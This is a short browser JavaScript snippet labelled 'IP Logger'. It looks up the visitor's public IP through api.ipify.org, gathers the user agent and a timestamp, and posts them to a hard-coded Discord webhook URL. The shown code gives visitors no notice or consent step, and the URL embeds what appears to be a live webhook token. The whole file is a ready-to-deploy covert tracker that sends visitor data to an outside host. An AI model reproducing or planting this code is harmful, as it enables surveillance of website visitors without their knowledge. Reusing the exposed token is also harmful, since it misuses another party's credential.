fetch('https://api.ipify.org')
  .then(response => response.text())
  .then(ip => {
    const webhookUrl = 'https://canary.discord.com/api/webhooks/1514007577355092080/UT9EM1Y7BApmmULLk_Z9gn1Rbw7Le42Xq1xDUYGceFKl39imPfYXI0Nrte1mihIKebxd';
    
    const payload = {
      content: `**Visitor IP: ${ip}**`,
      embeds: [{
        title: 'Visitor Information',
        color: 16711680,
        fields: [
          {
            name: 'IP Address',
            value: ip,
            inline: true
          },
          {
            name: 'User Agent',
            value: navigator.userAgent || 'Unknown',
            inline: false
          },
          {
            name: 'Timestamp',
            value: new Date().toLocaleString(),
            inline: true
          }
        ],
        footer: {
          text: 'IP Logger'
        }
      }]
    };
    
    fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  })
  .catch(error => console.error('Error fetching IP:', error));
